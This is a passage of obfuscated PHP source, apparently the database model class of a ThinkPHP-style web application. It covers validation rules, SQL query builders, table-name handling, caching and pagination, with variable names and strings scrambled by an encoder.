think_config($ä…’ª[386]); if (!isset($Ó´Ô÷™¹[$“ÁÈ½§‹]) || Session::get($“ÁÈ½§‹)) { return !1; } list($šÒ•Ä•, $“ÀË«ËŒ) = explode($ä…’ª[11], $Ó´Ô÷™¹[$“ÁÈ½§‹]); if ($“ÀË«ËŒ && Session::get($“ÁÈ½§‹ . $ä…’ª[10] . $šÒ•Ä•) === $“ÀË«ËŒ) { Session::remove($“ÁÈ½§‹ . $ä…’ª[10] . $šÒ•Ä•); return !0; } if (think_config($ä…’ª[389])) { Session::remove($“ÁÈ½§‹ . $ä…’ª[10] . $šÒ•Ä•); } return !1; } return !0; } public function regex($©êšÁÀš, $Ö¤ÓÓÄ) { $Šƒ¾½É =& $_SERVER[¼èá¯æÙ]; $ıëÙŸâ = array($Šƒ¾½É[390] => $Šƒ¾½É[391], $Šƒ¾½É[392] => $Šƒ¾½É[393], $Šƒ¾½É[394] => $Šƒ¾½É[395], $Šƒ¾½É[396] => $Šƒ¾½É[397], $Šƒ¾½É[398] => $Šƒ¾½É[399], $Šƒ¾½É[400] => $Šƒ¾½É[401], $Šƒ¾½É[402] => $Šƒ¾½É[403], $Šƒ¾½É[377] => $Šƒ¾½É[404], $Šƒ¾½É[405] => $Šƒ¾½É[406]); if (isset($ıëÙŸâ[strtolower($Ö¤ÓÓÄ)])) { $Ö¤ÓÓÄ = $ıëÙŸâ[strtolower($Ö¤ÓÓÄ)]; } return preg_match($Ö¤ÓÓÄ, $©êšÁÀš) === 1; } private function autoOperation(&$äÕà‹«, $‰œœ²ÊÂ) { $ä•õ­­Ï =& $_SERVER[¼èá¯æÙ]; if (!empty($this->options[$ä•õ­­Ï[407]])) { $óãà»¯ï = $this->options[$ä•õ­­Ï[407]]; unset($this->options[$ä•õ­­Ï[407]]); } elseif (!empty($this->_auto)) { $óãà»¯ï = $this->_auto; } if (isset($óãà»¯ï)) { foreach ($óãà»¯ï as $¡¤ØØ³) { if (empty($¡¤ØØ³[2])) { $¡¤ØØ³[2] = THINK_MODEL_INSERT; } if ($‰œœ²ÊÂ == $¡¤ØØ³[2] || $¡¤ØØ³[2] == THINK_MODEL_BOTH) { switch (trim($¡¤ØØ³[3])) { case $ä•õ­­Ï[408]: case $ä•õ­­Ï[409]: $èÂ¨‚‘ü = isset($¡¤ØØ³[4]) ? (array) $¡¤ØØ³[4] : array(); if (isset($äÕà‹«[$¡¤ØØ³[0]])) { array_unshift($èÂ¨‚‘ü, $äÕà‹«[$¡¤ØØ³[0]]); } if ($ä•õ­­Ï[408] == $¡¤ØØ³[3]) { $äÕà‹«[$¡¤ØØ³[0]] = call_user_func_array($¡¤ØØ³[1], $èÂ¨‚‘ü); } else { $äÕà‹«[$¡¤ØØ³[0]] = call_user_func_array(array(&$this, $¡¤ØØ³[1]), $èÂ¨‚‘ü); } break; case $ä•õ­­Ï[362]: $äÕà‹«[$¡¤ØØ³[0]] = $äÕà‹«[$¡¤ØØ³[1]]; break; case $ä•õ­­Ï[410]: if ($ä•õ­­Ï[12] === $äÕà‹«[$¡¤ØØ³[0]]) { unset($äÕà‹«[$¡¤ØØ³[0]]); } break; case $ä•õ­­Ï[411]: default: $äÕà‹«[$¡¤ØØ³[0]] = $¡¤ØØ³[1]; } if (!1 === $äÕà‹«[$¡¤ØØ³[0]]) { unset($äÕà‹«[$¡¤ØØ³[0]]); } } } } return $äÕà‹«; } protected function autoValidation($ÁóÉşÏ, $¯¡ÖÀ´) { $Ä¯ìÎæÔ =& $_SERVER[¼èá¯æÙ]; if (!empty($this->options[$Ä¯ìÎæÔ[412]])) { $ ©¯™÷Ú = $this->options[$Ä¯ìÎæÔ[412]]; unset($this->options[$Ä¯ìÎæÔ[412]]); } elseif (!empty($this->_validate)) { $ ©¯™÷Ú = $this->_validate; } if (isset($ ©¯™÷Ú)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ ©¯™÷Ú as $ÔÈ‰»²õ => $å“æšàü) { if (empty($å“æšàü[5]) || $å“æšàü[5] == THINK_MODEL_BOTH || $å“æšàü[5] == $¯¡ÖÀ´) { if (0 == strpos($å“æšàü[2], $Ä¯ìÎæÔ[413]) && strpos($å“æšàü[2], $Ä¯ìÎæÔ[414])) { $å“æšàü[2] = think_lang(substr($å“æšàü[2], 2, -1)); } $å“æšàü[3] = isset($å“æšàü[3]) ? $å“æšàü[3] : THINK_EXISTS_VALIDATE; $å“æšàü[4] = isset($å“æšàü[4]) ? $å“æšàü[4] : $Ä¯ìÎæÔ[415]; switch ($å“æšàü[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÁóÉşÏ, $å“æšàü)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ä¯ìÎæÔ[12] != trim($ÁóÉşÏ[$å“æšàü[0]])) { if (!1 === $this->_validationField($ÁóÉşÏ, $å“æšàü)) { return !1; } } break; default: if (isset($ÁóÉşÏ[$å“æšàü[0]])) { if (!1 === $this->_validationField($ÁóÉşÏ, $å“æšàü)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÖğôÑŒ«, $®„Ï¿²Õ) { if (!1 === $this->_validationFieldItem($ÖğôÑŒ«, $®„Ï¿²Õ)) { if ($this->patchValidate) { $this->error[$®„Ï¿²Õ[0]] = $®„Ï¿²Õ[2]; } else { $this->error = $®„Ï¿²Õ[2]; return !1; } } return; } protected function _validationFieldItem($Óˆ©â‰¬, $Û„íªñ) { $½òÌ†â½ =& $_SERVER[¼èá¯æÙ]; switch (strtolower(trim($Û„íªñ[4]))) { case $½òÌ†â½[408]: case $½òÌ†â½[409]: $£¬¡ıõ² = isset($Û„íªñ[6]) ? (array) $Û„íªñ[6] : array(); if (is_string($Û„íªñ[0]) && strpos($Û„íªñ[0], $½òÌ†â½[50])) { $Û„íªñ[0] = explode($½òÌ†â½[50], $Û„íªñ[0]); } if (is_array($Û„íªñ[0])) { foreach ($Û„íªñ[0] as $ÛşåÊú) { $¯…µó–Ù[$ÛşåÊú] = $Óˆ©â‰¬[$ÛşåÊú]; } array_unshift($£¬¡ıõ², $¯…µó–Ù); } else { array_unshift($£¬¡ıõ², $Óˆ©â‰¬[$Û„íªñ[0]]); } if ($½òÌ†â½[408] == $Û„íªñ[4]) { return call_user_func_array($Û„íªñ[1], $£¬¡ıõ²); } else { return call_user_func_array(array(&$this, $Û„íªñ[1]), $£¬¡ıõ²); } case $½òÌ†â½[416]: return $Óˆ©â‰¬[$Û„íªñ[0]] == $Óˆ©â‰¬[$Û„íªñ[1]]; case $½òÌ†â½[417]: if (is_string($Û„íªñ[0]) && strpos($Û„íªñ[0], $½òÌ†â½[50])) { $Û„íªñ[0] = explode($½òÌ†â½[50], $Û„íªñ[0]); } $š¯³Öèë = array(); if (is_array($Û„íªñ[0])) { foreach ($Û„íªñ[0] as $ÛşåÊú) { $š¯³Öèë[$ÛşåÊú] = $Óˆ©â‰¬[$ÛşåÊú]; } } else { $š¯³Öèë[$Û„íªñ[0]] = $Óˆ©â‰¬[$Û„íªñ[0]]; } if (!empty($Óˆ©â‰¬[$this->getPk()])) { $š¯³Öèë[$this->getPk()] = array($½òÌ†â½[418], $Óˆ©â‰¬[$this->getPk()]); } if ($this->where($š¯³Öèë)->find()) { return !1; } return !0; default: return $this->check($Óˆ©â‰¬[$Û„íªñ[0]], $Û„íªñ[1], $Û„íªñ[4]); } } public function check($àå‘¬û², $ò¿¬ß”û, $¹Ö‰¼ö = "\162\x65\x67\x65\x78") { $Äº½Ö› =& $_SERVER[¼èá¯æÙ]; $¹Ö‰¼ö = strtolower(trim($¹Ö‰¼ö)); switch ($¹Ö‰¼ö) { case $Äº½Ö›[7]: case $Äº½Ö›[419]: $ç¾Å¶î = is_array($ò¿¬ß”û) ? $ò¿¬ß”û : explode($Äº½Ö›[50], $ò¿¬ß”û); return $¹Ö‰¼ö == $Äº½Ö›[7] ? in_array($àå‘¬û², $ç¾Å¶î) : !in_array($àå‘¬û², $ç¾Å¶î); case $Äº½Ö›[420]: case $Äº½Ö›[421]: if (is_array($ò¿¬ß”û)) { $Ä¨¤Ğ° = $ò¿¬ß”û[0]; $ÜåİœŠ‡ = $ò¿¬ß”û[1]; } else { list($Ä¨¤Ğ°, $ÜåİœŠ‡) = explode($Äº½Ö›[50], $ò¿¬ß”û); } return $¹Ö‰¼ö == $Äº½Ö›[420] ? $àå‘¬û² >= $Ä¨¤Ğ° && $àå‘¬û² <= $ÜåİœŠ‡ : $àå‘¬û² < $Ä¨¤Ğ° || $àå‘¬û² > $ÜåİœŠ‡; case $Äº½Ö›[422]: case $Äº½Ö›[423]: return $¹Ö‰¼ö == $Äº½Ö›[422] ? $àå‘¬û² == $ò¿¬ß”û : $àå‘¬û² != $ò¿¬ß”û; case $Äº½Ö›[424]: $Ñåî£Á = mb_strlen($àå‘¬û², $Äº½Ö›[425]); if (strpos($ò¿¬ß”û, $Äº½Ö›[50])) { list($Ä¨¤Ğ°, $ÜåİœŠ‡) = explode($Äº½Ö›[50], $ò¿¬ß”û); return $Ñåî£Á >= $Ä¨¤Ğ° && $Ñåî£Á <= $ÜåİœŠ‡; } else { return $Ñåî£Á == $ò¿¬ß”û; } case $Äº½Ö›[426]: list($ ¿òŞ®ç, $ö€”™Â) = explode($Äº½Ö›[50], $ò¿¬ß”û); if (!is_numeric($ ¿òŞ®ç)) { $ ¿òŞ®ç = strtotime($ ¿òŞ®ç); } if (!is_numeric($ö€”™Â)) { $ö€”™Â = strtotime($ö€”™Â); } return NOW_TIME >= $ ¿òŞ®ç && NOW_TIME <= $ö€”™Â; case $Äº½Ö›[427]: return in_array(get_client_ip(), explode($Äº½Ö›[50], $ò¿¬ß”û)); case $Äº½Ö›[428]: return !in_array(get_client_ip(), explode($Äº½Ö›[50], $ò¿¬ß”û)); case $Äº½Ö›[415]: default: return $this->regex($àå‘¬û², $ò¿¬ß”û); } } public function query($¨É¨é€, $›•Õ§Ã« = false) { $ öÈœ½ =& $_SERVER[¼èá¯æÙ]; if (!is_bool($›•Õ§Ã«) && !is_array($›•Õ§Ã«)) { $›•Õ§Ã« = func_get_args(); array_shift($›•Õ§Ã«); } $¨É¨é€ = str_replace(array($ öÈœ½[59], $ öÈœ½[429]), $ öÈœ½[53], $¨É¨é€); $¨É¨é€ = $this->parseSql($¨É¨é€, $›•Õ§Ã«); return $this->db->query($¨É¨é€); } public function execute($–ò¯õÖˆ, $³êâî± = false) { if (!is_bool($³êâî±) && !is_array($³êâî±)) { $³êâî± = func_get_args(); array_shift($³êâî±); } $–ò¯õÖˆ = $this->parseSql($–ò¯õÖˆ, $³êâî±); return $this->db->execute($–ò¯õÖˆ); } protected function parseSql($Ÿ¬ú‡Ù¼, $©ã„ùä„) { $¤¾™¨§‹ =& $_SERVER[¼èá¯æÙ]; if (!0 === $©ã„ùä„) { $ç±¯³— = $this->_parseOptions(); $Ÿ¬ú‡Ù¼ = $this->db->parseSql($Ÿ¬ú‡Ù¼, $ç±¯³—); } elseif (is_array($©ã„ùä„)) { $©ã„ùä„ = array_map(array($this->db, $¤¾™¨§‹[430]), $©ã„ùä„); $Ÿ¬ú‡Ù¼ = vsprintf($Ÿ¬ú‡Ù¼, $©ã„ùä„); } else { $Ÿ¬ú‡Ù¼ = strtr($Ÿ¬ú‡Ù¼, array($¤¾™¨§‹[431] => $this->getTableName(), $¤¾™¨§‹[432] => think_config($¤¾™¨§‹[333]))); } $this->db->setModel($this->name); return $Ÿ¬ú‡Ù¼; } public function db($î˜ô¨ = '', $ ¼ï©ÏŞ = '', $‘“ÆÍ¾— = array()) { $Æ©¤œšä =& $_SERVER[¼èá¯æÙ]; if ($Æ©¤œšä[12] === $î˜ô¨ && $this->db) { return $this->db; } static $’»µøßš = array(); static $Âà”è¤¿ = array(); if (!isset($Âà”è¤¿[$î˜ô¨]) || isset($Âà”è¤¿[$î˜ô¨]) && $ ¼ï©ÏŞ && $’»µøßš[$î˜ô¨] != $ ¼ï©ÏŞ) { if (!empty($ ¼ï©ÏŞ) && is_string($ ¼ï©ÏŞ) && !1 === strpos($ ¼ï©ÏŞ, $Æ©¤œšä[8])) { $ ¼ï©ÏŞ = think_config($ ¼ï©ÏŞ); } $î˜ô¨ = think_guid($ ¼ï©ÏŞ); $Âà”è¤¿[$î˜ô¨] = Db::getInstance($ ¼ï©ÏŞ); } elseif (NULL === $ ¼ï©ÏŞ) { $Âà”è¤¿[$î˜ô¨]->close(); unset($Âà”è¤¿[$î˜ô¨]); return; } if (!empty($‘“ÆÍ¾—)) { if (is_string($‘“ÆÍ¾—)) { parse_str($‘“ÆÍ¾—, $‘“ÆÍ¾—); } foreach ($‘“ÆÍ¾— as $€ıƒ¬æŸ => $Ôà÷æ©¸) { $this->setProperty($€ıƒ¬æŸ, $Ôà÷æ©¸); } } $’»µøßš[$î˜ô¨] = $ ¼ï©ÏŞ; $this->db = $Âà”è¤¿[$î˜ô¨]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $°”òÙ—› = get_class($this); if ($°”òÙ—› == $_SERVER[¼èá¯æÙ][433]) { return $this->name; } $this->name = substr($°”òÙ—›, 0, -5); } return $this->name; } public function getTableName() { $¢¬„‚Ôµ =& $_SERVER[¼èá¯æÙ]; if (empty($this->trueTableName)) { $®“÷ùÏÖ = !empty($this->tablePrefix) ? $this->tablePrefix : $¢¬„‚Ôµ[12]; if (!empty($this->tableName)) { $®“÷ùÏÖ .= $this->tableName; } else { $®“÷ùÏÖ .= think_parse_name($this->name); } $this->trueTableName = strtolower($®“÷ùÏÖ); } return (!empty($this->dbName) ? $this->dbName . $¢¬„‚Ôµ[10] : $¢¬„‚Ôµ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ıÕ­© =& $_SERVER[¼èá¯æÙ]; return isset($this->fields[$ıÕ­©[340]]) ? $this->fields[$ıÕ­©[340]] : $this->pk; } public function getDbFields() { $é¥áüÒé =& $_SERVER[¼èá¯æÙ]; if (isset($this->options[$é¥áüÒé[368]])) { $„Ğ½§£Â = $this->db->getFields($this->options[$é¥áüÒé[368]]); return $„Ğ½§£Â ? array_keys($„Ğ½§£Â) : !1; } if ($this->fields) { $„Ğ½§£Â = $this->fields; unset($„Ğ½§£Â[$é¥áüÒé[339]], $„Ğ½§£Â[$é¥áüÒé[340]], $„Ğ½§£Â[$é¥áüÒé[341]], $„Ğ½§£Â[$é¥áüÒé[338]]); return $„Ğ½§£Â; } return !1; } public function data($ˆÏã¤Õ‰ = '') { $¦ï£Í½Ó =& $_SERVER[¼èá¯æÙ]; if ($¦ï£Í½Ó[12] === $ˆÏã¤Õ‰ && !empty($this->data)) { return $this->data; } if (is_object($ˆÏã¤Õ‰)) { $ˆÏã¤Õ‰ = get_object_vars($ˆÏã¤Õ‰); } elseif (is_string($ˆÏã¤Õ‰)) { parse_str($ˆÏã¤Õ‰, $ˆÏã¤Õ‰); } elseif (!is_array($ˆÏã¤Õ‰)) { think_exception(think_lang($¦ï£Í½Ó[360])); } $this->data = $ˆÏã¤Õ‰; return $this; } public function join($÷ÙáÁù) { $×ò§§Ìü =& $_SERVER[¼èá¯æÙ]; if (is_array($÷ÙáÁù)) { $this->options[$×ò§§Ìü[371]] = $÷ÙáÁù; } elseif (!empty($÷ÙáÁù)) { $this->options[$×ò§§Ìü[371]][] = $÷ÙáÁù; } return $this; } public function union($¾úäÈƒ¹, $Ôö¦› = false) { $õÑ©ÜÖ =& $_SERVER[¼èá¯æÙ]; if (empty($¾úäÈƒ¹)) { return $this; } if ($Ôö¦›) { $this->options[$õÑ©ÜÖ[434]][$õÑ©ÜÖ[435]] = !0; } if (is_object($¾úäÈƒ¹)) { $¾úäÈƒ¹ = get_object_vars($¾úäÈƒ¹); } if (is_string($¾úäÈƒ¹)) { $û°¡ŠÜ¢ = $¾úäÈƒ¹; } elseif (is_array($¾úäÈƒ¹)) { if (isset($¾úäÈƒ¹[0])) { $this->options[$õÑ©ÜÖ[434]] = array_merge($this->options[$õÑ©ÜÖ[434]], $¾úäÈƒ¹); return $this; } else { $û°¡ŠÜ¢ = $¾úäÈƒ¹; } } else { think_exception(think_lang($õÑ©ÜÖ[360])); } $this->options[$õÑ©ÜÖ[434]][] = $û°¡ŠÜ¢; return $this; } public function cache($´›¥Ğ¤• = true, $áÄİŠíó = null, $Òúï²¯ = '') { $Èû‚èüÀ =& $_SERVER[¼èá¯æÙ]; if (!1 !== $´›¥Ğ¤•) { $this->options[$Èû‚èüÀ[436]] = array($Èû‚èüÀ[107] => $´›¥Ğ¤•, $Èû‚èüÀ[426] => $áÄİŠíó, $Èû‚èüÀ[33] => $Òúï²¯); } return $this; } public function field($ó¨â¡©à, $ÎèöÚ©  = false) { $§ßœ›«Í =& $_SERVER[¼èá¯æÙ]; if (!0 === $ó¨â¡©à) { $‰±‡í¡• = $this->getDbFields(); $ó¨â¡©à = $‰±‡í¡• ? $‰±‡í¡• : $§ßœ›«Í[232]; } elseif ($ÎèöÚ© ) { if (is_string($ó¨â¡©à)) { $ó¨â¡©à = explode($§ßœ›«Í[50], $ó¨â¡©à); } $‰±‡í¡• = $this->getDbFields(); $ó¨â¡©à = $‰±‡í¡• ? array_diff($‰±‡í¡•, $ó¨â¡©à) : $ó¨â¡©à; } $this->options[$§ßœ›«Í[362]] = $ó¨â¡©à; return $this; } public function scope($ô¦¹œ»¥ = '', $ã›ØÃû• = NULL) { $ŞêÆ±ôû =& $_SERVER[¼èá¯æÙ]; if ($ŞêÆ±ôû[12] === $ô¦¹œ»¥) { if (isset($this->_scope[$ŞêÆ±ôû[37]])) { $æ§€öÕÑ = $this->_scope[$ŞêÆ±ôû[37]]; } else { return $this; } } elseif (is_string($ô¦¹œ»¥)) { $ÊÊ–ã”µ = explode($ŞêÆ±ôû[50], $ô¦¹œ»¥); $æ§€öÕÑ = array(); foreach ($ÊÊ–ã”µ as $Œ’Úıè‚) { if (!isset($this->_scope[$Œ’Úıè‚])) { continue; } $æ§€öÕÑ = array_merge($æ§€öÕÑ, $this->_scope[$Œ’Úıè‚]); } if (!empty($ã›ØÃû•) && is_array($ã›ØÃû•)) { $æ§€öÕÑ = array_merge($æ§€öÕÑ, $ã›ØÃû•); } } elseif (is_array($ô¦¹œ»¥)) { $æ§€öÕÑ = $ô¦¹œ»¥; } if (is_array($æ§€öÕÑ) && !empty($æ§€öÕÑ)) { $this->options = array_merge($this->options, array_change_key_case($æ§€öÕÑ)); } return $this; } public function where($¸ÀË—´Í, $Ñ“Ü„Ğº = null) { $»¸ËÂĞ =& $_SERVER[¼èá¯æÙ]; if (!is_null($Ñ“Ü„Ğº) && is_string($¸ÀË—´Í)) { if (!is_array($Ñ“Ü„Ğº)) { $Ñ“Ü„Ğº = func_get_args(); array_shift($Ñ“Ü„Ğº); } $Ñ“Ü„Ğº = array_map(array($this->db, $»¸ËÂĞ[430]), $Ñ“Ü„Ğº); $¸ÀË—´Í = vsprintf($¸ÀË—´Í, $Ñ“Ü„Ğº); } elseif (is_object($¸ÀË—´Í)) { $¸ÀË—´Í = get_object_vars($¸ÀË—´Í); } elseif (is_array($¸ÀË—´Í)) { foreach ($¸ÀË—´Í as $øÚ–„Š => $ÉåñÃ›) { if ((is_numeric($øÚ–„Š) || !$øÚ–„Š) && is_string($ÉåñÃ›)) { if (strpos($ÉåñÃ›, $»¸ËÂĞ[437]) === 0) { continue; } think_trace($»¸ËÂĞ[438], $»¸ËÂĞ[12], $»¸ËÂĞ[49]); die; } } } if (is_string($¸ÀË—´Í) && $»¸ËÂĞ[12] != $¸ÀË—´Í) { $º¯èÅ¯Ç = array(); $º¯èÅ¯Ç[$»¸ËÂĞ[439]] = $¸ÀË—´Í; $¸ÀË—´Í = $º¯èÅ¯Ç; } if (isset($this->options[$»¸ËÂĞ[364]])) { $this->options[$»¸ËÂĞ[364]] = array_merge($this->options[$»¸ËÂĞ[364]], $¸ÀË—´Í); } else { $this->options[$»¸ËÂĞ[364]] = $¸ÀË—´Í; } return $this; } public function limit($ùõØÈë, $Å°–ã’ = null) { $ş²ÀŒú =& $_SERVER[¼èá¯æÙ]; $this->options[$ş²ÀŒú[379]] = is_null($Å°–ã’) ? $ùõØÈë : $ùõØÈë . $ş²ÀŒú[50] . $Å°–ã’; return $this; } public function page($¼‡ÄÂ»ª, $ˆÙ¦»»Ä = null) { $ÖÖêÌÂ¼ =& $_SERVER[¼èá¯æÙ]; $this->options[$ÖÖêÌÂ¼[440]] = is_null($ˆÙ¦»»Ä) ? $¼‡ÄÂ»ª : $¼‡ÄÂ»ª . $ÖÖêÌÂ¼[50] . $ˆÙ¦»»Ä; return $this; } public function comment($ûËö†ß¸) { $this->options[$_SERVER[¼èá¯æÙ][441]] = $ûËö†ß¸; return $this; } public function setProperty($ÄÁÜä´ , $ıİ³¤õ¶) { if (property_exists($this, $ÄÁÜä´ )) { $this->{$ÄÁÜä´ } = $ıİ³¤õ¶; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\151\155\145", "\164\151\155\x65", "\x69\156\x73\145\162\x74\54\165\160\144\141\x74\145", "\x66\x75\156\143\x74\151\x6f\156"), array("\x63\x72\145\x61\164\145\x54\151\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\x65\162\x74", "\x66\165\156\x63\x74\x69\x6f\x6e")); public function setDataAuto($¥½Æ‚å) { $this->dataAuto = $¥½Æ‚å; } public function __construct($ìÇùÎ„¨ = '', $™ú ßÃ = '', $×µòĞ¾ä = '') { parent::__construct($ìÇùÎ„¨, $™ú ßÃ, $×µòĞ¾ä); } protected $tableMeta = array(); protected function _beforeInsert(&$‹½ã† Ò, $Çİµ°°Ğ) { $‡ÑÌıñË =& $_SERVER[¼èá¯æÙ]; if (!$this->checkDataAutoHas($‡ÑÌıñË[442])) { return; } $this->dataBeforeFilter($‹½ã† Ò, $‡ÑÌıñË[442]); } protected function _beforeUpdate(&$ûßË‘Üƒ, $’ö•Œæ) { $„°¯õ—· =& $_SERVER[¼èá¯æÙ]; if (!$this->checkDataAutoHas($„°¯õ—·[443])) { return; } $this->dataBeforeFilter($ûßË‘Üƒ, $„°¯õ—·[443]); } protected function _afterSelect(&$Šê­¹ô·, $ï¡æÒµ) { if (!is_array($Šê­¹ô·)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼èá¯æÙ][444])) { return; } foreach ($Šê­¹ô· as &$Ö­ÔÄû) { $this->dataAfterFilter($Ö­ÔÄû); } unset($Ö­ÔÄû); } protected function _afterFind(&$åšôˆúÓ, $­ÅÖÌ×Ò) { if (!is_array($åšôˆúÓ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼èá¯æÙ][444])) { return; } $this->dataAfterFilter($åšôˆúÓ); } public static function textEncode($Í¯Ì•§Š) { if (!$Í¯Ì•§Š) { return $Í¯Ì•§Š; } $·ÆËìğ¡ = json_encode($Í¯Ì•§Š); $·ÆËìğ¡ = preg_replace_callback($_SERVER[¼èá¯æÙ][445], function ($÷‰ÇïÈ) { return addslashes($÷‰ÇïÈ[0]); }, $·ÆËìğ¡); return json_decode($·ÆËìğ¡); } public static function textDecode($éØ¯œÄŠ) { $€ÏöŞ =& $_SERVER[¼èá¯æÙ]; $‹ñÔßÄÌ = json_encode($éØ¯œÄŠ); $‹ñÔßÄÌ = preg_replace_callback($€ÏöŞ[446], function ($Ëûà’ ) { return $_SERVER[¼èá¯æÙ][110]; }, $‹ñÔßÄÌ); return json_decode($‹ñÔßÄÌ); } public function setAutoIncrement($ñÒ‰ÂÎË) { $ì—çÖ­è = array($this->getPk() => $ñÒ‰ÂÎË); $µ¡®¡Ôş = $this->data($ì—çÖ­è)->add(); if ($µ¡®¡Ôş) { $this->delete($µ¡®¡Ôş); } } public function getAutoIncrement() { $‡ôŠŞ·† = $this->getTableName(); $ö¸ùá³• = $this->max($this->getPk()); $µ«ª®şÒ = $this->query("\x73\x68\x6f\167\40\164\141\142\154\145\40\163\x74\x61\164\165\163\40\x77\150\x65\162\145\40\x4e\141\155\145\x3d\47{$‡ôŠŞ·†}\47"); $ò—ğÖƒƒ = $µ«ª®şÒ[0][$_SERVER[¼èá¯æÙ][447]]; $ô·ÛÉÄ = max($ö¸ùá³•, $ò—ğÖƒƒ); return $ô·ÛÉÄ; } protected function _callBefore($ğ±ÂÁãÔ, $‚ŒåµÃó) { return $this->cacheCallCheck($ğ±ÂÁãÔ, $‚ŒåµÃó, !1); } protected function _callAfter($Ìò„µÃÏ, $ÜòÜç÷¸) { return $this->cacheCallCheck($Ìò„µÃÏ, $ÜòÜç÷¸, !0); } protected function cacheFunctionAlias($ç„Ó€û×) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($…—Ú‰›€, $“«øÄ­, $¢Œ¿ùÚ = false) { $ÃÆœ´œÑ =& $_SERVER[¼èá¯æÙ]; $Ù¾••Ïƒ = $this->cacheFunctionAlias($“«øÄ­); if (!$Ù¾••Ïƒ) { return; } foreach ($Ù¾••Ïƒ as $Ä¹ƒë–„ => $›Œİ¤¬³) { $´Ğ®¹ïµ = $›Œİ¤¬³[0]; $ë¦İÄ°ç = explode($ÃÆœ´œÑ[50], $›Œİ¤¬³[1]); $³‚Úæ—ï = isset($›Œİ¤¬³[2]) ? $›Œİ¤¬³[2] : $ÃÆœ´œÑ[12]; if ($…—Ú‰›€ == $Ä¹ƒë–„) { return $this->cacheFunctionGet($Ä¹ƒë–„, $´Ğ®¹ïµ, $³‚Úæ—ï); } if ($¢Œ¿ùÚ && in_array($…—Ú‰›€, $ë¦İÄ°ç)) { $this->cacheFunctionClear($Ä¹ƒë–„, $´Ğ®¹ïµ, $³‚Úæ—ï); } } } public function cacheFunctionGet($Çñ÷ø±®, $œ×ªíÈ, $†‚üŸ = '') { $ÙôãÍµî = $this->cacheKeyMake($Çñ÷ø±®, $œ×ªíÈ, $†‚üŸ); $Â©±‹‚ = Cache::get($ÙôãÍµî); if (!is_array($Â©±‹‚)) { $Â©±‹‚ = call_user_func_array(array($this, $Çñ÷ø±®), array($œ×ªíÈ, !0)); Cache::set($ÙôãÍµî, $Â©±‹‚); } return $Â©±‹‚; } public function cacheFunctionClear($†ú¶¤œË, $Â®ˆ¢Æü, $¹„öµ¥¾ = '') { $Ğ¡İÖöÁ = $Â®ˆ¢Æü; if (!is_array($Â®ˆ¢Æü)) { $Ğ¡İÖöÁ = array($Â®ˆ¢Æü); } foreach ($Ğ¡İÖöÁ as $ŒéŞÌ£Í) { $µü¾Â  = $this->cacheKeyMake($†ú¶¤œË, $ŒéŞÌ£Í, $¹„öµ¥¾); Cache::remove($µü¾Â ); } } public function cacheKeyMake($çÅ¡ñ„¦, $ú©åŞ‡Ò, $„ëï×·) { $ø»¬³Š =& $_SERVER[¼èá¯æÙ]; if ($„ëï×·) { $ú©åŞ‡Ò = $ú©åŞ‡Ò . $ø»¬³Š[448] . $„ëï×·; } return get_class($this) . $ø»¬³Š[11] . $çÅ¡ñ„¦ . $ø»¬³Š[449] . $ú©åŞ‡Ò; } protected function selectPageReset() { $™ÒÃ¯“÷ =& $_SERVER[¼èá¯æÙ]; if (isset($GLOBALS[$™ÒÃ¯“÷[450]])) { return; } $GLOBALS[$™ÒÃ¯“÷[450]] = isset($GLOBALS[$™ÒÃ¯“÷[7]][$™ÒÃ¯“÷[451]]) ? $GLOBALS[$™ÒÃ¯“÷[7]][$™ÒÃ¯“÷[451]] : !1; $GLOBALS[$™ÒÃ¯“÷[452]] = isset($GLOBALS[$™ÒÃ¯“÷[7]][$™ÒÃ¯“÷[440]]) ? $GLOBALS[$™ÒÃ¯“÷[7]][$™ÒÃ¯“÷[440]] : !1; $GLOBALS[$™ÒÃ¯“÷[7]][$™ÒÃ¯“÷[451]] = !1; $GLOBALS[$™ÒÃ¯“÷[7]][$™ÒÃ¯“÷[440]] = !1; } protected function selectPageRestore() { $®¤› =& $_SERVER[¼èá¯æÙ]; if (!isset($GLOBALS[$®¤›[450]])) { return; } $GLOBALS[$®¤›[7]][$®¤›[451]] = $GLOBALS[$®¤›[450]]; $GLOBALS[$®¤›[7]][$®¤›[440]] = $GLOBALS[$®¤›[452]]; if ($GLOBALS[$®¤›[7]][$®¤›[451]] === !1) { unset($GLOBALS[$®¤›[7]][$®¤›[451]]); } if ($GLOBALS[$®¤›[7]][$®¤›[440]] === !1) { unset($GLOBALS[$®¤›[7]][$®¤›[440]]); } unset($GLOBALS[$®¤›[450]]); unset($GLOBALS[$®¤›[452]]); } protected function selectPage($¦Î ò„Á = 200, $¶æî ß‰ = 1) { $Ì®‹€§ =& $_SERVER[¼èá¯æÙ]; global $in; $¿¾¿™ó = $this->optionsValue(); $Ô¼İöò³ = 50000; $¦Î ò„Á = isset($in[$Ì®‹€§[451]]) && $in[$Ì®‹€§[451]] ? $in[$Ì®‹€§[451]] : $¦Î ò„Á; if ($¦Î ò„Á === -1) { $in[$Ì®‹€§[451]] = !1; $Ô¼İöò³ = 100000000; $¦Î ò„Á = $Ô¼İöò³; } $àÇÂëÖü = $¿¾¿™ó; $àÇÂëÖü[$Ì®‹€§[453]] = array(); $¦Î ò„Á = intval($¦Î ò„Á); $¦Î ò„Á = $¦Î ò„Á <= 5 ? 5 : ($¦Î ò„Á >= $Ô¼İöò³ ? $Ô¼İöò³ : $¦Î ò„Á); 